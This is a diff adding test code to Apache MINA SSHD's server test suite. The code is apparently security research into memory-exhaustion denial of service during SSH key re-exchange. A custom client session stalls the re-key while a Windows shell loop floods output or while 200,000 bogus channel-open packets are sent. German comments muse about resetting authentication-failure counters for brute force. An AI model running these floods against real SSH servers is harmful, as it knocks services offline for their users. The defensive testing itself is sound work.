@@ -18,21 +18,10 @@
  */
 package org.apache.sshd.server;
 
-import java.io.ByteArrayOutputStream;
-import java.io.IOException;
-import java.io.InputStream;
-import java.io.OutputStream;
-import java.io.PipedInputStream;
-import java.io.PipedOutputStream;
-import java.io.StreamCorruptedException;
+import java.io.*;
 import java.nio.charset.StandardCharsets;
 import java.time.Duration;
-import java.util.Arrays;
-import java.util.Collection;
-import java.util.Collections;
-import java.util.EnumSet;
-import java.util.List;
-import java.util.Map;
+import java.util.*;
 import java.util.concurrent.CopyOnWriteArrayList;
 import java.util.concurrent.CountDownLatch;
 import java.util.concurrent.Semaphore;
@@ -40,33 +29,49 @@ import java.util.concurrent.TimeUnit;
 import java.util.concurrent.atomic.AtomicInteger;
 import java.util.concurrent.atomic.AtomicReference;
 
+import net.bytebuddy.utility.RandomString;
+import org.apache.sshd.client.ClientFactoryManager;
 import org.apache.sshd.client.SshClient;
 import org.apache.sshd.client.auth.keyboard.UserInteraction;
 import org.apache.sshd.client.channel.ChannelExec;
 import org.apache.sshd.client.channel.ChannelShell;
+import org.apache.sshd.client.channel.ClientChannel;
 import org.apache.sshd.client.channel.ClientChannelEvent;
 import org.apache.sshd.client.future.AuthFuture;
+import org.apache.sshd.client.kex.DHGEXClient;
 import org.apache.sshd.client.session.ClientConnectionServiceFactory;
 import org.apache.sshd.client.session.ClientSession;
 import org.apache.sshd.client.session.ClientSessionImpl;
+import org.apache.sshd.client.session.ClientUserAuthService;
+import org.apache.sshd.common.SshConstants;
+import org.apache.sshd.common.auth.AbstractUserAuthServiceFactory;
 import org.apache.sshd.common.auth.UserAuthMethodFactory;
 import org.apache.sshd.common.channel.Channel;
 import org.apache.sshd.common.channel.ChannelListener;
 import org.apache.sshd.common.channel.Window;
 import org.apache.sshd.common.channel.WindowClosedException;
+import org.apache.sshd.common.future.DefaultKeyExchangeFuture;
+import org.apache.sshd.common.future.KeyExchangeFuture;
+import org.apache.sshd.common.future.SshFutureListener;
 import org.apache.sshd.common.io.IoSession;
-import org.apache.sshd.common.kex.KexProposalOption;
+import org.apache.sshd.common.io.IoWriteFuture;
+import org.apache.sshd.common.io.nio2.Nio2Session;
+import org.apache.sshd.common.kex.*;
+import org.apache.sshd.common.kex.extension.KexExtensions;
 import org.apache.sshd.common.session.Session;
 import org.apache.sshd.common.session.SessionContext;
 import org.apache.sshd.common.session.SessionDisconnectHandler;
 import org.apache.sshd.common.session.SessionListener;
 import org.apache.sshd.common.session.helpers.AbstractConnectionService;
 import org.apache.sshd.common.session.helpers.AbstractSession;
+import org.apache.sshd.common.session.helpers.PendingWriteFuture;
 import org.apache.sshd.common.session.helpers.TimeoutIndicator;
 import org.apache.sshd.common.session.helpers.TimeoutIndicator.TimeoutStatus;
 import org.apache.sshd.common.util.GenericUtils;
 import org.apache.sshd.common.util.MapEntryUtils.NavigableMapBuilder;
 import org.apache.sshd.common.util.OsUtils;
+import org.apache.sshd.common.util.ProxyUtils;
+import org.apache.sshd.common.util.buffer.Buffer;
 import org.apache.sshd.core.CoreModuleProperties;
 import org.apache.sshd.deprecated.ClientUserAuthServiceOld;
 import org.apache.sshd.server.auth.keyboard.InteractiveChallenge;
@@ -76,8 +81,10 @@ import org.apache.sshd.server.auth.password.RejectAllPasswordAuthenticator;
 import org.apache.sshd.server.auth.pubkey.RejectAllPublickeyAuthenticator;
 import org.apache.sshd.server.channel.ChannelSession;
 import org.apache.sshd.server.command.Command;
+import org.apache.sshd.server.session.ServerConnectionServiceFactory;
 import org.apache.sshd.server.session.ServerSession;
 import org.apache.sshd.server.session.ServerSessionImpl;
+import org.apache.sshd.server.shell.InteractiveProcessShellFactory;
 import org.apache.sshd.util.test.BaseTestSupport;
 import org.apache.sshd.util.test.EchoShell;
 import org.apache.sshd.util.test.EchoShellFactory;
@@ -620,6 +627,400 @@ public class ServerTest extends BaseTestSupport {
             s.close(false);
         } finally {
             client.stop();
+        }
+    }
+
+    @Test
+    public void testAuthedServerSideKexEnqueueingOom() throws Exception {
+        sshd.setShellFactory(new InteractiveProcessShellFactory());
+        sshd.start();
+
+        // Increase timeout on client because server won't send any data during the attack
+        CoreModuleProperties.NIO2_READ_TIMEOUT.set(client,  Duration.ofSeconds(3600));
+        client.setSessionFactory(new org.apache.sshd.client.session.SessionFactory(client) {
+            @Override
+            protected ClientSessionImpl doCreateSession(IoSession ioSession) throws Exception {
+                return new MyClientSessionImpl(getClient(), ioSession);
+            }
+        });
+
+        client.start();
+
+        try (ClientSession session = createTestClientSession(sshd)) {
+            final MyClientSessionImpl myClientSession = ((MyClientSessionImpl) session);
+            Thread.sleep(1000L);
+            System.out.println("Attack starting");
+
+            ClientChannel channel = session.createChannel(Channel.CHANNEL_SHELL);
+            channel.open().verify(OPEN_TIMEOUT);
+            OutputStream invertedIn = channel.getInvertedIn();
+            InputStream invertedOut = channel.getInvertedOut();
+/*
+            String cmdSentPwd = "pwd \n";
+            invertedIn.write(cmdSentPwd.getBytes());
+            invertedIn.flush();
+            Collection<ClientChannelEvent> result
+                    = channel.waitFor(EnumSet.of(ClientChannelEvent.STDOUT_DATA), TimeUnit.SECONDS.toMillis(2L));
+
+            readLines(invertedOut, true, 5);
+*/
+            long read_length = 0;
+            final int block_length = 3000;
+            // Create a random file by appending data multiple times (shell command size is limited at least on Windows)
+            String randomBytes = RandomString.make(block_length);
+
+            String cmdSent = "for /l %x in (1, 1, 100000000000) do echo %x-" + randomBytes+ "\n";
+            invertedIn.write(cmdSent.getBytes());
+            invertedIn.flush();
+            channel.waitFor(EnumSet.of(ClientChannelEvent.STDOUT_DATA), TimeUnit.SECONDS.toMillis(2L));
+
+            readLines(invertedOut, true, 7);
+
+            // Prepare the client to not finish the incoming key exchange
+            myClientSession.processKexPackets = false;
+            // don't enqueue any packets on the client side while in key exchange, these are the attack payload
+            myClientSession.enqueuePacketsWhileInKex = false;
+            // Trigger a key exchange
+            session.reExchangeKeys();
+/*
+            final int requested_data_volume = 1024*1024*1204;
+            for (int i = 0; i < (requested_data_volume / read_length); i++) {
+
+                String cmdCatFile = "cat randomTestFile.txt\n";
+                invertedIn.write(cmdCatFile.getBytes());
+                invertedIn.flush();
+
+                //result = channel.waitFor(EnumSet.of(ClientChannelEvent.STDOUT_DATA), TimeUnit.SECONDS.toMillis(5L));
+                //readLines(invertedOut, true, 10);
+
+                if (i % 500 == 0) {
+                    System.out.println("Number of sent cat commands: " + (i + 1) );
+                }
+                Thread.sleep(1);
+                myClientSession.resetIdleTimeout();
+
+            }
+            System.out.println("Attack finished");
+*/
+            channel.waitFor(EnumSet.of(ClientChannelEvent.CLOSED), TimeUnit.SECONDS.toMillis(3600L));
+            Thread.sleep(1000L);
+            channel.close();
+            client.close();
+
+        } finally {
+            client.stop();
+        }
+
+    }
+
+    private static void readLines(InputStream in, boolean canEof, int count) throws IOException {
+        for (int i = 0; i < count; i++) {
+            String response = readLine(in, true);
+            System.out.println(i + ": " + response);
+        }
+    }
+
+
+    private static String readLine(InputStream in, boolean canEof) throws IOException {
+        try (ByteArrayOutputStream baos = new ByteArrayOutputStream(Byte.MAX_VALUE)) {
+            for (;;) {
+                int c = in.read();
+                if (c == '\n') {
+                    return baos.toString(StandardCharsets.UTF_8.name());
+                } else if (c == -1) {
+                    if (!canEof) {
+                        throw new EOFException("EOF while await end of line");
+                    }
+                    return null;
+                } else {
+                    baos.write(c);
+                }
+            }
+        }
+    }
+
+    @Test
+    /**
+     * Versuch ein OOM zu provozieren, wenn ein Benutzer nicht authentisiert ist.
+     * Dies ist nicht gelungen, weil kein Befehl gefunden wurde, der zu einem Puffern von Daten während des
+     * Re-Kex führt.
+     */
+    public void testAuthedServerSideKexEnqueueingOomUnauthenticated() throws Exception {
+        sshd.start();
+
+        // Increase timeout on client because server won't send any data during the attack
+        CoreModuleProperties.NIO2_READ_TIMEOUT.set(client,  Duration.ofSeconds(3600));
+        client.setSessionFactory(new org.apache.sshd.client.session.SessionFactory(client) {
+            @Override
+            protected ClientSessionImpl doCreateSession(IoSession ioSession) throws Exception {
+                return new MyClientSessionImpl(getClient(), ioSession);
+            }
+        });
+
+        client.start();
+        final String connectionServiceName = "ssh-connection";
+
+        try (ClientSession session = createTestClientSession(sshd)) {
+            final MyClientSessionImpl myClientSession = ((MyClientSessionImpl) session);
+            Thread.sleep(1000L);
+            System.out.println("Attack starting");
+
+            myClientSession.processKexPackets = false;
+            session.reExchangeKeys();
+
+            myClientSession.enqueuePacketsWhileInKex = false;
+
+            for (int i=0; i<200000;i++) {
+
+                //ClientChannel channel = session.createChannel(Channel.CHANNEL_SHELL);
+                final String unknownChannelType = "unknown";
+                Buffer buffer = myClientSession.createBuffer(SshConstants.SSH_MSG_CHANNEL_OPEN, unknownChannelType.length() + Integer.SIZE);
+                buffer.putString(unknownChannelType);
+                buffer.putInt(1);
+                buffer.putInt(1);
+                buffer.putInt(1);
+                myClientSession.writePacket(buffer);
+                Thread.sleep(5);
+
+                if (i % 500 == 0) {
+                    System.out.println("Number of sent channel open requests: " + i );
+                }
+                myClientSession.resetIdleTimeout();
+
+/*
+                    Buffer request = session.createBuffer(SshConstants.SSH_MSG_CHANNEL_REQUEST, connectionServiceName.length() + Byte.SIZE);
+                request.putString(connectionServiceName);
+                session.writePacket(request);
+                */
+            }
+            System.out.println("Attack finished");
+
+            Thread.sleep(1000L);
+            client.close();
+
+        } finally {
+            client.stop();
+        }
+
+    }
+
+    /**
+     * Test
+     */
+    @Test
+    public void testServerSideKexOOM() throws Exception {
+        sshd.start();
+
+
+        /*
+        List<KeyExchangeFactory> kexFactories = new ArrayList<>();
+        KeyExchangeFactory kexFactory = new KeyExchangeFactory() {
+            @Override
+            public String getName() {
+                return BuiltinDHFactories.dhgex256.getName();
+            }
+
+            @Override
+            public KeyExchange createKeyExchange(Session session) throws Exception {
+                return new DHGEXClient(BuiltinDHFactories.dhgex256, session) {
+                    private int entry = 0;
+
+                    @Override
+                    public boolean next(int cmd, Buffer buffer) throws Exception {
+                        entry++;
+                        if (entry <= 0) {
+                            return super.next(cmd, buffer);
+                        }
+
+                        for (int i=0; i<1;i++) {
+                            Buffer buffer2 = session.createBuffer(KexExtensions.SSH_MSG_EXT_INFO);
+                            byte[] payload = new byte[1024];
+
+                            buffer2.putRawBytes(payload);
+                            session.writePacket(buffer2);
+                        }
+
+                        return true;
+                    }
+                };
+            }
+        };
+        kexFactories.add(kexFactory);
+        client.setKeyExchangeFactories(kexFactories);
+        client.addSessionListener(new SessionListener() {
+
+            @Override
+            public void sessionEvent(final Session session, Event event) {
+                final MyClientSessionImpl mySession = ((MyClientSessionImpl) session);
+                // This event is received twice because MyClientSessionImpl sends it again after KEX is really finished
+                if (Event.KeyEstablished.equals(event) && KexState.DONE.equals((mySession.getKexState()))) {
+                    if (mySession.myKexFutureHolder.get() != null) {
+                        mySession.myKexFutureHolder.get().setValue(true);
+                    }
+                }
+            }
+
+        });
+/*
+        */
+        client.setSessionFactory(new org.apache.sshd.client.session.SessionFactory(client) {
+            @Override
+            protected ClientSessionImpl doCreateSession(IoSession ioSession) throws Exception {
+                return new MyClientSessionImpl(getClient(), ioSession);
+            }
+        });
+
+
+        client.start();
+        try {
+            try (ClientSession session = client.connect(getCurrentTestName(), TEST_LOCALHOST, sshd.getPort())
+                    .verify(CONNECT_TIMEOUT).getSession()) {
+
+                final MyClientSessionImpl mySession = ((MyClientSessionImpl) session);
+
+                /*
+                mySession.myServiceAcceptFutureHolder.get().verify(20000L);
+                System.out.println("Attack started");
+
+                mySession.reExchangeKeys();
+                mySession.myKexFutureHolder.get().verify(DEFAULT_TIMEOUT);
+                System.out.println("reExchangeKeys finished");
+
+                System.out.println("Sending UserAuth Requests");
+                mySession.enqueuePacketsWhileInKex = false;
+                for (int i = 0; i < 20; i++) {
+                    Buffer buffer2 = session.createBuffer(SshConstants.SSH_MSG_USERAUTH_REQUEST);
+                    byte[] payload = new byte[1024];
+
+                    buffer2.putRawBytes(payload);
+                    mySession.writePacket(buffer2);
+                }
+
+                // TODO: Finish KeyExchange
+                // Kann Password-Auth mehrmals mit falschem Password aufgerufen werden? Wie sind die AbstractUserAuth
+                // gegen Brute Force geschützt?
+
+                Thread.sleep(1000L);
+                System.out.println("Switch Service");
+                Buffer request = session.createBuffer(SshConstants.SSH_MSG_SERVICE_REQUEST, AbstractUserAuthServiceFactory.DEFAULT_NAME.length() + Byte.SIZE);
+                request.putString(AbstractUserAuthServiceFactory.DEFAULT_NAME);
+                session.writePacket(request);
+                Thread.sleep(1000L);
+
+                System.out.println("Second Attack started");
+                for (int i = 0; i < 20; i++) {
+                    Buffer buffer2 = session.createBuffer(SshConstants.SSH_MSG_USERAUTH_REQUEST);
+                    byte[] payload = new byte[1024];
+
+                    buffer2.putRawBytes(payload);
+                    mySession.writePacket(buffer2);
+                }
+                System.out.println("Attack finished");
+
+
+                // Wird nach 21 Versuchen mit too many authentication failures
+                // Überlegung: Auth Service dann erneut setzen, dann müsste der Zähler neu starten
+
+                //((MyClientSessionImpl) session).getKexFuture().verify(10000);
+                //Thread.sleep(10000L);
+
+                // Prevent the client from reading any packets from the server to provoke serverside buffers to fill up
+//                session.getIoSession().suspendRead();
+
+                // Start authentication to set an active service in the server session
+/**                session.addPasswordIdentity(getCurrentTestName());
+                String username = session.getUsername();
+                Buffer buffer = session.createBuffer(SshConstants.SSH_MSG_USERAUTH_REQUEST,
+                        username.length() + AbstractUserAuthServiceFactory.DEFAULT_NAME.length() + Integer.SIZE);
+                buffer.putString(username);
+                buffer.putString(AbstractUserAuthServiceFactory.DEFAULT_NAME);
+                buffer.putString("none");
+                session.writePacket(buffer);
+                // Restart Kex
+                session.reExchangeKeys();
+
+                for (int i=0; i<10;i++) {
+                    Buffer buffer2 = session.createBuffer(SshConstants.SSH_MSG_USERAUTH_REQUEST);
+                    byte[] payload = new byte[1024];
+
+                    buffer2.putRawBytes(payload);
+                    session.writePacket(buffer2);
+                }
+*/
+
+        Thread.sleep(1000000L);
+            }
+        } finally {
+            client.stop();
+        }
+    }
+
+    /**
+     * Specialized ClientSession that allows to initiate a KEX renegotation and than send further requests to the server
+     */
+    public static class MyClientSessionImpl  extends ClientSessionImpl {
+        boolean enqueuePacketsWhileInKex = true;
+        boolean processKexPackets = true;
+        protected final AtomicReference<DefaultKeyExchangeFuture> myKexFutureHolder = new AtomicReference<>(null);
+        protected final AtomicReference<DefaultKeyExchangeFuture> myServiceAcceptFutureHolder = new AtomicReference<>(null);
+
+        public MyClientSessionImpl(ClientFactoryManager client, IoSession ioSession) throws Exception {
+            super(client, ioSession);
+            myKexFutureHolder.set(new DefaultKeyExchangeFuture("myKexFutureHolder", null));
+            myServiceAcceptFutureHolder.set(new DefaultKeyExchangeFuture("myKexFutureHolder", null));
+        }
+
+        @Override
+        public void startService(String name, Buffer buffer) throws Exception {
+            myServiceAcceptFutureHolder.set(new DefaultKeyExchangeFuture("myKexFutureHolder", null));
+            super.startService(name, buffer);
+        }
+
+        @Override
+        protected void handleKexInit(Buffer buffer) throws Exception {
+            if (processKexPackets) {
+                super.handleKexInit(buffer);
+            }
+        }
+
+        @Override
+        protected void doKexNegotiation() throws Exception {
+            super.doKexNegotiation();
+            /**
+            enqueuePacketsWhileInKex = false;
+            Buffer buffer = createBuffer((byte) (SshConstants.SSH_MSG_KEX_LAST + 1));
+            int p = buffer.wpos();
+            buffer.wpos(p + SshConstants.MSG_KEX_COOKIE_SIZE);
+            writePacket(buffer);
+             */
+        }
+
+        @Override
+        public KeyExchangeFuture reExchangeKeys() throws IOException {
+            myKexFutureHolder.set(new DefaultKeyExchangeFuture("myKexFutureHolder", null));
+            return super.reExchangeKeys();
+        }
+
+        public DefaultKeyExchangeFuture getKexFuture() {
+            return kexFutureHolder.get();
+        }
+
+        @Override
+        protected void handleServiceAccept(String serviceName, Buffer buffer) throws Exception {
+            super.handleServiceAccept(serviceName, buffer);
+            myServiceAcceptFutureHolder.get().setValue(true);
+        }
+
+        protected void handleNewKeys(int cmd, Buffer buffer) throws Exception {
+            super.handleNewKeys(cmd, buffer);
+            myKexFutureHolder.get().setValue(true);
+        }
+
+        protected PendingWriteFuture enqueuePendingPacket(Buffer buffer) {
+            if (enqueuePacketsWhileInKex) {
+                return super.enqueuePendingPacket(buffer);
+            }
+            return null;
         }
     }
 
